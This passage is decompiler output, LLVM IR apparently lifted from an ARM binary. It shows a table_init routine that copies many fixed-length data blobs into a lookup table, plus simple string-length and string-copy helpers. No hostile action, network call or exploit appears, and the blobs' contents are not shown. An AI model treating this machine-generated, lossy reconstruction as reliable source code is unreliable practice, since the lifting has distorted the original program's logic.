  store i32 %v1_105b4, i32* @ip, align 4
  %v8_105bc = icmp sgt i32 %v4_105b0, %v1_105b4
  br i1 %v8_105bc, label %dec_label_pc_10570.dec_label_pc_10570_crit_edge, label %dec_label_pc_105c0.loopexit

dec_label_pc_10570.dec_label_pc_10570_crit_edge:  ; preds = %dec_label_pc_10570
  %v0_10578.pre = load i32, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_10570

dec_label_pc_105c0.loopexit:                      ; preds = %dec_label_pc_10570
  %v2_105c0.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_105c0

dec_label_pc_105c0:                               ; preds = %dec_label_pc_105c0.loopexit, %entry
  %v2_105c0 = phi i32 [ %v2_105c0.pre, %dec_label_pc_105c0.loopexit ], [ %v3_10554, %entry ]
  store i32 %v2_105c0, i32* @r4, align 4
  ret i32 %v2_1053c

; uselistorder directives
  uselistorder i32 %v1_105b4, { 1, 2, 0 }
  uselistorder i32 %v1_10564, { 1, 0 }
  uselistorder i32 %v2_10540, { 3, 0, 1, 2 }
  uselistorder i32 %v3_10538, { 1, 0 }
}

define i32 @table_init(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_105d0 = load i32, i32* @r4, align 4
  %v6_105d0 = load i32, i32* @r5, align 4
  %v9_105d0 = load i32, i32* @r6, align 4
  %v12_105d0 = load i32, i32* @r7, align 4
  %v15_105d0 = load i32, i32* @r8, align 4
  %v21_105d0 = load i32, i32* @sl, align 4
  %v24_105d0 = load i32, i32* @fp, align 4
  store i32 2, i32* @r0, align 4
  %v0_105dc = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24f6c.217 to i32), i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  store i32 %v0_105dc, i32* @r5, align 4
  %v3_105f4 = call i32 @util_memcpy(i32 %v0_105dc, i32 ptrtoint (i32* @global_var_19b20.225 to i32), i32 2)
  store i32 12, i32* @r0, align 4
  store i32 12, i32* @fp, align 4
  %v0_10600 = load i32, i32* @r5, align 4
  store i32 %v0_10600, i32* @global_var_24f74.226, align 4
  %v0_10604 = load i32, i32* @r6, align 4
  %v1_10604 = trunc i32 %v0_10604 to i16
  store i16 %v1_10604, i16* bitcast (i32* @global_var_24f78.227 to i16*), align 4
  %v0_10608 = call i32 @malloc()
  %v0_10610 = load i32, i32* @fp, align 4
  store i32 %v0_10608, i32* @r5, align 4
  %v4_10618 = call i32 @util_memcpy(i32 %v0_10608, i32 ptrtoint ([13 x i8]* @global_var_19b24.229 to i32), i32 %v0_10610)
  %v0_1061c = load i32, i32* @fp, align 4
  store i32 %v0_1061c, i32* @r0, align 4
  %v0_10620 = load i32, i32* @r5, align 4
  store i32 %v0_10620, i32* @global_var_24f7c.230, align 4
  %v1_10624 = trunc i32 %v0_1061c to i16
  store i16 %v1_10624, i16* bitcast (i32* @global_var_24f80.231 to i16*), align 4
  %v0_10628 = call i32 @malloc()
  %v0_10630 = load i32, i32* @fp, align 4
  store i32 %v0_10628, i32* @r5, align 4
  %v4_10638 = call i32 @util_memcpy(i32 %v0_10628, i32 ptrtoint ([13 x i8]* @global_var_19b34.233 to i32), i32 %v0_10630)
  %v0_1063c = load i32, i32* @r6, align 4
  store i32 %v0_1063c, i32* @r0, align 4
  %v0_10640 = load i32, i32* @r5, align 4
  store i32 %v0_10640, i32* @global_var_24f84.234, align 4
  %v0_10644 = load i32, i32* @fp, align 4
  %v1_10644 = trunc i32 %v0_10644 to i16
  store i16 %v1_10644, i16* bitcast (i32* @global_var_24f88.235 to i16*), align 4
  %v0_10648 = call i32 @malloc()
  %v0_1064c = load i32, i32* @r6, align 4
  store i32 %v0_10648, i32* @r5, align 4
  %v3_10658 = call i32 @util_memcpy(i32 %v0_10648, i32 ptrtoint (i32* @global_var_19b44.237 to i32), i32 %v0_1064c)
  store i32 36, i32* @r0, align 4
  %v0_10660 = load i32, i32* @r5, align 4
  store i32 %v0_10660, i32* @global_var_24f8c.238, align 4
  %v0_10664 = load i32, i32* @r6, align 4
  %v1_10664 = trunc i32 %v0_10664 to i16
  store i16 %v1_10664, i16* bitcast (i32* @global_var_24f90.239 to i16*), align 4
  %v0_10668 = call i32 @malloc()
  store i32 %v0_10668, i32* @r5, align 4
  %v4_10678 = call i32 @util_memcpy(i32 %v0_10668, i32 ptrtoint ([37 x i8]* @global_var_19b48.241 to i32), i32 36)
  store i32 6, i32* @r0, align 4
  %v0_10684 = load i32, i32* @r5, align 4
  store i32 %v0_10684, i32* @global_var_24f94.242, align 4
  store i16 36, i16* bitcast (i32* @global_var_24f98.243 to i16*), align 4
  %v0_1068c = call i32 @malloc()
  store i32 %v0_1068c, i32* @r5, align 4
  %v4_1069c = call i32 @util_memcpy(i32 %v0_1068c, i32 ptrtoint ([7 x i8]* @global_var_19b70.245 to i32), i32 6)
  store i32 7, i32* @r0, align 4
  store i32 7, i32* @r6, align 4
  store i16 6, i16* bitcast (i32* @global_var_24fa0.246 to i16*), align 4
  %v0_106b0 = load i32, i32* @r5, align 4
  store i32 %v0_106b0, i32* @global_var_24f9c.247, align 4
  %v0_106b4 = call i32 @malloc()
  %v0_106b8 = load i32, i32* @r6, align 4
  store i32 %v0_106b4, i32* @r5, align 4
  %v4_106c4 = call i32 @util_memcpy(i32 %v0_106b4, i32 ptrtoint ([8 x i8]* @global_var_19b78.249 to i32), i32 %v0_106b8)
  %v0_106c8 = load i32, i32* @r6, align 4
  store i32 %v0_106c8, i32* @r0, align 4
  %v0_106cc = load i32, i32* @r5, align 4
  store i32 %v0_106cc, i32* @global_var_24fa4.250, align 4
  %v1_106d0 = trunc i32 %v0_106c8 to i16
  store i16 %v1_106d0, i16* bitcast (i32* @global_var_24fa8.251 to i16*), align 4
  %v0_106d4 = call i32 @malloc()
  %v0_106d8 = load i32, i32* @r6, align 4
  store i32 %v0_106d4, i32* @r5, align 4
  %v4_106e4 = call i32 @util_memcpy(i32 %v0_106d4, i32 ptrtoint ([8 x i8]* @global_var_19b80.253 to i32), i32 %v0_106d8)
  store i32 3, i32* @r0, align 4
  %v0_106ec = load i32, i32* @r5, align 4
  store i32 %v0_106ec, i32* @global_var_24fac.254, align 4
  %v0_106f0 = load i32, i32* @r6, align 4
  %v1_106f0 = trunc i32 %v0_106f0 to i16
  store i16 %v1_106f0, i16* bitcast (i32* @global_var_24fb0.255 to i16*), align 4
  %v0_106f4 = call i32 @malloc()
  store i32 %v0_106f4, i32* @r5, align 4
  %v4_10704 = call i32 @util_memcpy(i32 %v0_106f4, i32 ptrtoint ([4 x i8]* @global_var_19b88.257 to i32), i32 3)
  store i32 19, i32* @r0, align 4
  %v0_10710 = load i32, i32* @r5, align 4
  store i32 %v0_10710, i32* @global_var_24fb4.258, align 4
  store i16 3, i16* bitcast (i32* @global_var_24fb8.259 to i16*), align 4
  %v0_10718 = call i32 @malloc()
  store i32 19, i32* @sl, align 4
  store i32 %v0_10718, i32* @r5, align 4
  %v3_1072c = call i32 @util_memcpy(i32 %v0_10718, i32 ptrtoint (i32* @global_var_19b8c.261 to i32), i32 19)
  store i32 24, i32* @r0, align 4
  %v0_10734 = load i32, i32* @r5, align 4
  store i32 %v0_10734, i32* @global_var_24fbc.262, align 4
  %v0_10738 = load i32, i32* @sl, align 4
  %v1_10738 = trunc i32 %v0_10738 to i16
  store i16 %v1_10738, i16* bitcast (i32* @global_var_24fc0.263 to i16*), align 4
  %v0_1073c = call i32 @malloc()
  store i32 %v0_1073c, i32* @r5, align 4
  %v3_1074c = call i32 @util_memcpy(i32 %v0_1073c, i32 ptrtoint (i32* @global_var_19ba0.265 to i32), i32 24)
  store i32 9, i32* @r0, align 4
  store i16 24, i16* bitcast (i32* @global_var_24fc8.266 to i16*), align 4
  %v0_1075c = load i32, i32* @r5, align 4
  store i32 %v0_1075c, i32* @global_var_24fc4.267, align 4
  %v0_10760 = call i32 @malloc()
  store i32 %v0_10760, i32* @r5, align 4
  %v4_10770 = call i32 @util_memcpy(i32 %v0_10760, i32 ptrtoint ([10 x i8]* @global_var_19bbc.269 to i32), i32 9)
  store i32 16, i32* @r0, align 4
  %v0_1077c = load i32, i32* @r5, align 4
  store i32 %v0_1077c, i32* @global_var_24fcc.270, align 4
  store i16 9, i16* bitcast (i32* @global_var_24fd0.271 to i16*), align 4
  %v0_10784 = call i32 @malloc()
  store i32 16, i32* @sb, align 4
  store i32 %v0_10784, i32* @r5, align 4
  %v4_10798 = call i32 @util_memcpy(i32 %v0_10784, i32 ptrtoint ([17 x i8]* @global_var_19bc8.273 to i32), i32 16)
  store i32 22, i32* @r0, align 4
  %v0_107a0 = load i32, i32* @r5, align 4
  store i32 %v0_107a0, i32* @global_var_24fd4.274, align 4
  %v0_107a4 = load i32, i32* @sb, align 4
  %v1_107a4 = trunc i32 %v0_107a4 to i16
  store i16 %v1_107a4, i16* bitcast (i32* @global_var_24fd8.275 to i16*), align 4
  %v0_107a8 = call i32 @malloc()
  store i32 %v0_107a8, i32* @r5, align 4
  %v4_107b8 = call i32 @util_memcpy(i32 %v0_107a8, i32 ptrtoint ([23 x i8]* @global_var_19bdc.277 to i32), i32 22)
  %v0_107c0 = load i32, i32* @r6, align 4
  store i32 %v0_107c0, i32* @r0, align 4
  store i16 22, i16* bitcast (i32* @global_var_24fe0.278 to i16*), align 4
  %v0_107c8 = load i32, i32* @r5, align 4
  store i32 %v0_107c8, i32* @global_var_24fdc.279, align 4
  %v0_107cc = call i32 @malloc()
  %v0_107d0 = load i32, i32* @r6, align 4
  store i32 %v0_107cc, i32* @r5, align 4
  %v4_107dc = call i32 @util_memcpy(i32 %v0_107cc, i32 ptrtoint ([8 x i8]* @global_var_19bf4.281 to i32), i32 %v0_107d0)
  store i32 5, i32* @r0, align 4
  %v0_107e4 = load i32, i32* @r5, align 4
  store i32 %v0_107e4, i32* @global_var_24fe4.282, align 4
  %v0_107e8 = load i32, i32* @r6, align 4
  %v1_107e8 = trunc i32 %v0_107e8 to i16
  store i16 %v1_107e8, i16* bitcast (i32* @global_var_24fe8.283 to i16*), align 4
  %v0_107ec = call i32 @malloc()
  store i32 %v0_107ec, i32* @r5, align 4
  %v4_107fc = call i32 @util_memcpy(i32 %v0_107ec, i32 ptrtoint ([6 x i8]* @global_var_19bfc.285 to i32), i32 5)
  store i32 4, i32* @r0, align 4
  %v0_10808 = load i32, i32* @r5, align 4
  store i32 %v0_10808, i32* @global_var_24fec.286, align 4
  store i16 5, i16* bitcast (i32* @global_var_24ff0.287 to i16*), align 4
  %v0_10810 = call i32 @malloc()
  store i32 %v0_10810, i32* @r5, align 4
  %v4_10820 = call i32 @util_memcpy(i32 %v0_10810, i32 ptrtoint ([5 x i8]* @global_var_19c04.289 to i32), i32 4)
  store i32 6, i32* @r0, align 4
  store i16 4, i16* bitcast (i32* @global_var_24ff8.290 to i16*), align 4
  %v0_10830 = load i32, i32* @r5, align 4
  store i32 %v0_10830, i32* @global_var_24ff4.291, align 4
  %v0_10834 = call i32 @malloc()
  store i32 %v0_10834, i32* @r5, align 4
  %v4_10844 = call i32 @util_memcpy(i32 %v0_10834, i32 ptrtoint ([7 x i8]* @global_var_19c0c.293 to i32), i32 6)
  store i32 14, i32* @r0, align 4
  %v0_10850 = load i32, i32* @r5, align 4
  store i32 %v0_10850, i32* @global_var_24ffc.294, align 4
  store i16 6, i16* bitcast (i32* @global_var_25000.295 to i16*), align 4
  %v0_10858 = call i32 @malloc()
  store i32 14, i32* @r7, align 4
  store i32 %v0_10858, i32* @r5, align 4
  %v4_1086c = call i32 @util_memcpy(i32 %v0_10858, i32 ptrtoint ([15 x i8]* @global_var_19c14.297 to i32), i32 14)
  store i32 8, i32* @r0, align 4
  %v0_10874 = load i32, i32* @r5, align 4
  store i32 %v0_10874, i32* @global_var_25004.298, align 4
  %v0_10878 = load i32, i32* @r7, align 4
  %v1_10878 = trunc i32 %v0_10878 to i16
  store i16 %v1_10878, i16* bitcast (i32* @global_var_25008.299 to i16*), align 4
  %v0_1087c = call i32 @malloc()
  store i32 8, i32* @r8, align 4
  store i32 %v0_1087c, i32* @r5, align 4
  %v4_10890 = call i32 @util_memcpy(i32 %v0_1087c, i32 ptrtoint ([9 x i8]* @global_var_19c24.301 to i32), i32 8)
  %v0_10898 = load i32, i32* @r6, align 4
  store i32 %v0_10898, i32* @r0, align 4
  %v0_1089c = load i32, i32* @r8, align 4
  %v1_1089c = trunc i32 %v0_1089c to i16
  %v2_1089c = load i32, i32* @r4, align 4
  %v4_1089c = add i32 %v2_1089c, 276
  %v5_1089c = inttoptr i32 %v4_1089c to i16*
  store i16 %v1_1089c, i16* %v5_1089c, align 2
  %v0_108a0 = load i32, i32* @r5, align 4
  store i32 %v0_108a0, i32* @global_var_2507c.302, align 4
  %v0_108a4 = call i32 @malloc()
  %v0_108a8 = load i32, i32* @r6, align 4
  store i32 %v0_108a4, i32* @r5, align 4
  %v4_108b4 = call i32 @util_memcpy(i32 %v0_108a4, i32 ptrtoint ([8 x i8]* @global_var_19c30.304 to i32), i32 %v0_108a8)
  %v0_108bc = load i32, i32* @sb, align 4
  store i32 %v0_108bc, i32* @r0, align 4
  %v0_108c0 = load i32, i32* @r6, align 4
  %v1_108c0 = trunc i32 %v0_108c0 to i16
  %v2_108c0 = load i32, i32* @r4, align 4
  %v4_108c0 = add i32 %v2_108c0, 284
  %v5_108c0 = inttoptr i32 %v4_108c0 to i16*
  store i16 %v1_108c0, i16* %v5_108c0, align 2
  %v0_108c4 = load i32, i32* @r5, align 4
  store i32 %v0_108c4, i32* @global_var_25084.305, align 4
  %v0_108c8 = call i32 @malloc()
  %v0_108cc = load i32, i32* @sb, align 4
  store i32 %v0_108c8, i32* @r5, align 4
  %v4_108d8 = call i32 @util_memcpy(i32 %v0_108c8, i32 ptrtoint ([17 x i8]* @global_var_19c38.307 to i32), i32 %v0_108cc)
  store i32 23, i32* @r0, align 4
  %v0_108e0 = load i32, i32* @r5, align 4
  store i32 %v0_108e0, i32* @global_var_2500c.308, align 4
  %v0_108e4 = load i32, i32* @sb, align 4
  %v1_108e4 = trunc i32 %v0_108e4 to i16
  store i16 %v1_108e4, i16* bitcast (i32* @global_var_25010.309 to i16*), align 4
  %v0_108e8 = call i32 @malloc()
  %v0_108f4 = load i32, i32* @r6, align 4
  %v1_108f4 = load i32, i32* @sb, align 4
  %v2_108f4 = add i32 %v1_108f4, %v0_108f4
  store i32 %v2_108f4, i32* @r6, align 4
  store i32 %v0_108e8, i32* @r5, align 4
  %v4_108fc = call i32 @util_memcpy(i32 %v0_108e8, i32 ptrtoint ([24 x i8]* @global_var_19c4c.311 to i32), i32 23)
  %v0_10900 = load i32, i32* @r8, align 4
  store i32 %v0_10900, i32* @r0, align 4
  %v0_10904 = load i32, i32* @r5, align 4
  store i32 %v0_10904, i32* @global_var_25014.312, align 4
  %v0_10908 = load i32, i32* @r6, align 4
  %v1_10908 = trunc i32 %v0_10908 to i16
  store i16 %v1_10908, i16* bitcast (i32* @global_var_25018.313 to i16*), align 4
  %v0_1090c = call i32 @malloc()
  %v0_10914 = load i32, i32* @r8, align 4
  store i32 %v0_1090c, i32* @r5, align 4
  %v4_1091c = call i32 @util_memcpy(i32 %v0_1090c, i32 ptrtoint ([9 x i8]* @global_var_19c64.315 to i32), i32 %v0_10914)
  %v0_10920 = load i32, i32* @r7, align 4
  store i32 %v0_10920, i32* @r0, align 4
  %v0_10924 = load i32, i32* @r5, align 4
  store i32 %v0_10924, i32* @global_var_2501c.316, align 4
  %v0_10928 = load i32, i32* @r8, align 4
  %v1_10928 = trunc i32 %v0_10928 to i16
  store i16 %v1_10928, i16* bitcast (i32* @global_var_25020.317 to i16*), align 4
  %v0_1092c = call i32 @malloc()
  %v0_10934 = load i32, i32* @r7, align 4
  store i32 %v0_1092c, i32* @r5, align 4
  %v4_1093c = call i32 @util_memcpy(i32 %v0_1092c, i32 ptrtoint ([15 x i8]* @global_var_19c70.319 to i32), i32 %v0_10934)
  %v0_10940 = load i32, i32* @sl, align 4
  store i32 %v0_10940, i32* @r0, align 4
  %v0_10944 = load i32, i32* @r5, align 4
  store i32 %v0_10944, i32* @global_var_25024.320, align 4
  %v0_10948 = load i32, i32* @r7, align 4
  %v1_10948 = trunc i32 %v0_10948 to i16
  store i16 %v1_10948, i16* bitcast (i32* @global_var_25028.321 to i16*), align 4
  %v0_1094c = call i32 @malloc()
  store i32 ptrtoint ([20 x i8]* @global_var_19c80.323 to i32), i32* @sb, align 4
  %v0_10954 = load i32, i32* @sl, align 4
  store i32 %v0_1094c, i32* @r5, align 4
  %v4_10960 = call i32 @util_memcpy(i32 %v0_1094c, i32 ptrtoint ([20 x i8]* @global_var_19c80.323 to i32), i32 %v0_10954)
  store i32 10, i32* @r0, align 4
  %v0_10968 = load i32, i32* @r5, align 4
  store i32 %v0_10968, i32* @global_var_2502c.324, align 4
  %v0_1096c = load i32, i32* @sl, align 4
  %v1_1096c = trunc i32 %v0_1096c to i16
  store i16 %v1_1096c, i16* bitcast (i32* @global_var_25030.325 to i16*), align 4
  %v0_10970 = call i32 @malloc()
  store i32 %v0_10970, i32* @r5, align 4
  %v4_10980 = call i32 @util_memcpy(i32 %v0_10970, i32 ptrtoint ([11 x i8]* @global_var_19c94.327 to i32), i32 10)
  store i32 21, i32* @r0, align 4
  %v2_10990 = load i32, i32* @r4, align 4
  %v4_10990 = add i32 %v2_10990, 292
  %v5_10990 = inttoptr i32 %v4_10990 to i16*
  store i16 10, i16* %v5_10990, align 2
  %v0_10994 = load i32, i32* @r5, align 4
  store i32 %v0_10994, i32* @global_var_2508c.328, align 4
  %v0_10998 = call i32 @malloc()
  store i32 %v0_10998, i32* @r5, align 4
  %v3_109a8 = call i32 @util_memcpy(i32 %v0_10998, i32 ptrtoint (i32* @global_var_19cf8.330 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_25038.331 to i16*), align 4
  %v0_109b8 = load i32, i32* @r5, align 4
  store i32 %v0_109b8, i32* @global_var_25034.332, align 4
  %v0_109bc = call i32 @malloc()
  store i32 %v0_109bc, i32* @r5, align 4
  %v4_109cc = call i32 @util_memcpy(i32 %v0_109bc, i32 ptrtoint ([18 x i8]* @global_var_19ca0.334 to i32), i32 17)
  %v0_109d4 = load i32, i32* @fp, align 4
  store i32 %v0_109d4, i32* @r0, align 4
  %v0_109d8 = load i32, i32* @r5, align 4
  store i32 %v0_109d8, i32* @global_var_2503c.335, align 4
  store i16 17, i16* bitcast (i32* @global_var_25040.336 to i16*), align 4
  %v0_109e0 = call i32 @malloc()
  %v0_109e8 = load i32, i32* @fp, align 4
  store i32 %v0_109e0, i32* @r5, align 4
  %v4_109f0 = call i32 @util_memcpy(i32 %v0_109e0, i32 ptrtoint ([13 x i8]* @global_var_19cb4.338 to i32), i32 %v0_109e8)
  %v0_109f4 = load i32, i32* @r7, align 4
  store i32 %v0_109f4, i32* @r0, align 4
  %v0_109f8 = load i32, i32* @r5, align 4
  store i32 %v0_109f8, i32* @global_var_25044.339, align 4
  %v0_109fc = load i32, i32* @fp, align 4
  %v1_109fc = trunc i32 %v0_109fc to i16
  store i16 %v1_109fc, i16* bitcast (i32* @global_var_25048.340 to i16*), align 4
  %v0_10a00 = call i32 @malloc()
  %v0_10a08 = load i32, i32* @r7, align 4
  store i32 %v0_10a00, i32* @r5, align 4
  %v4_10a10 = call i32 @util_memcpy(i32 %v0_10a00, i32 ptrtoint ([15 x i8]* @global_var_19c70.319 to i32), i32 %v0_10a08)
  %v0_10a14 = load i32, i32* @sl, align 4
  store i32 %v0_10a14, i32* @r0, align 4
  %v0_10a18 = load i32, i32* @r5, align 4
  store i32 %v0_10a18, i32* @global_var_2504c.341, align 4
  %v0_10a1c = load i32, i32* @r7, align 4
  %v1_10a1c = trunc i32 %v0_10a1c to i16
  store i16 %v1_10a1c, i16* bitcast (i32* @global_var_25050.342 to i16*), align 4
  %v0_10a20 = call i32 @malloc()
  %v0_10a24 = load i32, i32* @sb, align 4
  %v0_10a28 = load i32, i32* @sl, align 4
  store i32 %v0_10a20, i32* @r5, align 4
  %v4_10a30 = call i32 @util_memcpy(i32 %v0_10a20, i32 %v0_10a24, i32 %v0_10a28)
  %v0_10a34 = load i32, i32* @r8, align 4
  store i32 %v0_10a34, i32* @r0, align 4
  %v0_10a38 = load i32, i32* @r5, align 4
  store i32 %v0_10a38, i32* @global_var_25054.343, align 4
  %v0_10a3c = load i32, i32* @sl, align 4
  %v1_10a3c = trunc i32 %v0_10a3c to i16
  store i16 %v1_10a3c, i16* bitcast (i32* @global_var_25058.344 to i16*), align 4
  %v0_10a40 = call i32 @malloc()
  %v0_10a48 = load i32, i32* @r8, align 4
  store i32 %v0_10a40, i32* @r5, align 4
  %v4_10a50 = call i32 @util_memcpy(i32 %v0_10a40, i32 ptrtoint ([9 x i8]* @global_var_19cc4.346 to i32), i32 %v0_10a48)
  store i32 5, i32* @r0, align 4
  %v0_10a58 = load i32, i32* @r5, align 4
  store i32 %v0_10a58, i32* @global_var_2505c.347, align 4
  %v0_10a5c = load i32, i32* @r8, align 4
  %v1_10a5c = trunc i32 %v0_10a5c to i16
  store i16 %v1_10a5c, i16* bitcast (i32* @global_var_25060.348 to i16*), align 4
  %v0_10a60 = call i32 @malloc()
  store i32 %v0_10a60, i32* @r5, align 4
  %v4_10a70 = call i32 @util_memcpy(i32 %v0_10a60, i32 ptrtoint ([6 x i8]* @global_var_19cd0.350 to i32), i32 5)
  store i32 6, i32* @r0, align 4
  store i16 5, i16* bitcast (i32* @global_var_25068.351 to i16*), align 4
  %v0_10a80 = load i32, i32* @r5, align 4
  store i32 %v0_10a80, i32* @global_var_25064.352, align 4
  %v0_10a84 = call i32 @malloc()
  store i32 %v0_10a84, i32* @r5, align 4
  %v4_10a94 = call i32 @util_memcpy(i32 %v0_10a84, i32 ptrtoint ([7 x i8]* @global_var_19cd8.354 to i32), i32 6)
  %v0_10aa0 = load i32, i32* @r6, align 4
  store i32 %v0_10aa0, i32* @r0, align 4
  %v2_10aa4 = load i32, i32* @r4, align 4
  %v4_10aa4 = add i32 %v2_10aa4, 260
  %v5_10aa4 = inttoptr i32 %v4_10aa4 to i16*
  store i16 6, i16* %v5_10aa4, align 2
  %v0_10aa8 = load i32, i32* @r5, align 4
  store i32 %v0_10aa8, i32* @global_var_2506c.355, align 4
  %v0_10aac = call i32 @malloc()
  %v0_10ab4 = load i32, i32* @r6, align 4
  store i32 %v0_10aac, i32* %r5.global-to-local, align 4
  %v4_10abc = call i32 @util_memcpy(i32 %v0_10aac, i32 ptrtoint ([24 x i8]* @global_var_19ce0.357 to i32), i32 %v0_10ab4)
  %v0_10ac4 = load i32, i32* @r6, align 4
  %v1_10ac4 = trunc i32 %v0_10ac4 to i16
  %v2_10ac4 = load i32, i32* @r4, align 4
  %v4_10ac4 = add i32 %v2_10ac4, 268
  %v5_10ac4 = inttoptr i32 %v4_10ac4 to i16*
  store i16 %v1_10ac4, i16* %v5_10ac4, align 2
  %v0_10ac8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10ac8, i32* @global_var_25074.358, align 4
  store i32 %v3_105d0, i32* @r4, align 4
  store i32 %v6_105d0, i32* @r5, align 4
  store i32 %v9_105d0, i32* @r6, align 4
  store i32 %v12_105d0, i32* @r7, align 4
  store i32 %v15_105d0, i32* @r8, align 4
  store i32 %v21_105d0, i32* @sl, align 4
  store i32 %v24_105d0, i32* @fp, align 4
  ret i32 %v4_10abc

; uselistorder directives
  uselistorder i32 %v0_10aac, { 1, 0 }
  uselistorder i32 %v0_10a40, { 1, 0 }
  uselistorder i32 %v0_10a20, { 1, 0 }
  uselistorder i32 %v0_10a00, { 1, 0 }
  uselistorder i32 %v0_109e0, { 1, 0 }
  uselistorder i32 %v0_1094c, { 1, 0 }
  uselistorder i32 %v0_1092c, { 1, 0 }
  uselistorder i32 %v0_1090c, { 1, 0 }
  uselistorder i32 %v0_108e8, { 1, 0 }
  uselistorder i32 %v0_108c8, { 1, 0 }
  uselistorder i32 %v0_108a4, { 1, 0 }
  uselistorder i32 %v0_1087c, { 1, 0 }
  uselistorder i32 %v0_10858, { 1, 0 }
  uselistorder i32 %v0_107cc, { 1, 0 }
  uselistorder i32 %v0_10784, { 1, 0 }
  uselistorder i32 %v0_10718, { 1, 0 }
  uselistorder i32 %v0_106d4, { 1, 0 }
  uselistorder i32 %v0_106b4, { 1, 0 }
  uselistorder i32 %v0_10648, { 1, 0 }
  uselistorder i32 %v0_10628, { 1, 0 }
  uselistorder i32 %v0_10608, { 1, 0 }
  uselistorder i32 %v0_105dc, { 1, 0 }
  uselistorder i32 23, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_24f6c.217 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10b68 = load i8, i8* %arg1, align 1
  %v2_10b6c = icmp eq i8 %v3_10b68, 0
  %v0_10b70 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10b6c, i32 %v0_10b70)
  br label %dec_label_pc_10b78

dec_label_pc_10b78:                               ; preds = %dec_label_pc_10b78, %entry
  %v0_10b78 = phi i32 [ %v1_10b78, %dec_label_pc_10b78 ], [ 0, %entry ]
  %v1_10b78 = add i32 %v0_10b78, 1
  %v2_10b7c = add i32 %v1_10b78, %tmp
  %v3_10b7c = inttoptr i32 %v2_10b7c to i8*
  %v4_10b7c = load i8, i8* %v3_10b7c, align 1
  %v6_10b7c = zext i8 %v4_10b7c to i32
  store i32 %v6_10b7c, i32* @r3, align 4
  %v2_10b80 = icmp eq i8 %v4_10b7c, 0
  br i1 %v2_10b80, label %dec_label_pc_10b88, label %dec_label_pc_10b78

dec_label_pc_10b88:                               ; preds = %dec_label_pc_10b78
  ret i32 %v1_10b78
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_10b8c = load i8, i8* %arg1, align 1
  %v3_10b8c = zext i8 %v2_10b8c to i32
  store i32 %v3_10b8c, i32* @r2, align 4
  %v2_10b90 = icmp eq i8 %v2_10b8c, 0
  br i1 %v2_10b90, label %bb, label %dec_label_pc_10b9c

bb:                                               ; preds = %entry
  store i32 %v3_10b8c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10bb0

dec_label_pc_10b9c:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10ba0

dec_label_pc_10ba0:                               ; preds = %dec_label_pc_10ba0, %dec_label_pc_10b9c
  %v0_10ba0 = phi i32 [ %v1_10ba0, %dec_label_pc_10ba0 ], [ 0, %dec_label_pc_10b9c ]
  %v1_10ba0 = add i32 %v0_10ba0, 1
  store i32 %v1_10ba0, i32* %ip.global-to-local, align 4
  %v2_10ba4 = add i32 %v1_10ba0, %tmp
  %v3_10ba4 = inttoptr i32 %v2_10ba4 to i8*
  %v4_10ba4 = load i8, i8* %v3_10ba4, align 1
  %v2_10ba8 = icmp eq i8 %v4_10ba4, 0
  br i1 %v2_10ba8, label %dec_label_pc_10bb0, label %dec_label_pc_10ba0

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10ba0, %bb
  %v0_10bb0 = phi i32 [ %v3_10b8c, %bb ], [ %v1_10ba0, %dec_label_pc_10ba0 ]
  br label %dec_label_pc_10bbc

dec_label_pc_10bb8:                               ; preds = %dec_label_pc_10bbc
  %v0_10bb8 = load i32, i32* @r1, align 4
  %v1_10bb8 = add i32 %v0_10bb8, 1
  %v2_10bb8 = inttoptr i32 %v1_10bb8 to i8*
  %v3_10bb8 = load i8, i8* %v2_10bb8, align 1
  %v4_10bb8 = zext i8 %v3_10bb8 to i32
  store i32 %v4_10bb8, i32* @r2, align 4
  store i32 %v1_10bb8, i32* @r1, align 4
  %v0_10bbc.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_10bbc

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bb0, %dec_label_pc_10bb8
  %v0_10bc4.off0 = phi i8 [ %v2_10b8c, %dec_label_pc_10bb0 ], [ %v3_10bb8, %dec_label_pc_10bb8 ]
  %v0_10bbc = phi i32 [ %v0_10bb0, %dec_label_pc_10bb0 ], [ %v0_10bbc.pr, %dec_label_pc_10bb8 ]
  %v1_10bbc = add i32 %v0_10bbc, -1
  store i32 %v1_10bbc, i32* @r3, align 4
  %v3_10bc0 = icmp eq i32 %v0_10bbc, 0
  %v2_10bc4 = load i32, i32* @r0, align 4
  %v3_10bc4 = inttoptr i32 %v2_10bc4 to i8*
  store i8 %v0_10bc4.off0, i8* %v3_10bc4, align 1
  %v4_10bc4 = load i32, i32* @r0, align 4
  %v5_10bc4 = add i32 %v4_10bc4, 1
  store i32 %v5_10bc4, i32* @r0, align 4
  br i1 %v3_10bc0, label %dec_label_pc_10bcc, label %dec_label_pc_10bb8

dec_label_pc_10bcc:                               ; preds = %dec_label_pc_10bbc
  %v0_10bcc = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_10bcc

; uselistorder directives
  uselistorder i32 %v0_10bbc, { 1, 0 }
